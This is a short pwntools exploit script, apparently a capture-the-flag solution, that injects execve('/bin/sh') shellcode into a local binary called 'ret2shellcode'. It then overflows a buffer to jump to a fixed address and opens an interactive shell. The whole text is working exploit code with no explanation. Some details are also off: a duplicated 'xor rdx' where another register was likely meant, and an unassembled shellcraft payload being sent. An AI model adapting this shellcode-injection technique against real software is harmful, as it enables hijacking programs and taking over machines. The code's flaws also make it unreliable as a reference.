from pwn import *
p=process('./ret2shellcode')

p.recvuntil(':')

context.arch = 'amd64'

# 1
sc = asm('''
mov rbx, 0x68732f6e69622f
push rbx
mov rdi, rsp
xor rdx, rdx
xor rdx, rdx
mov rax, 0x3b
syscall
	''')
# 2
sc="\x48\xBB\x2F\x62\x69\x6E\x2F\x73\x68\x00\x53\x48\x89\xE7\x48\x31\xD2\x48\x31\xD2\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05"

# 3
sc=shellcraft.sh()
print(sc)

p.send(sc)

t = 'a' * 0x18 + p64(0x601060)
p.send(t)

p.interactive()
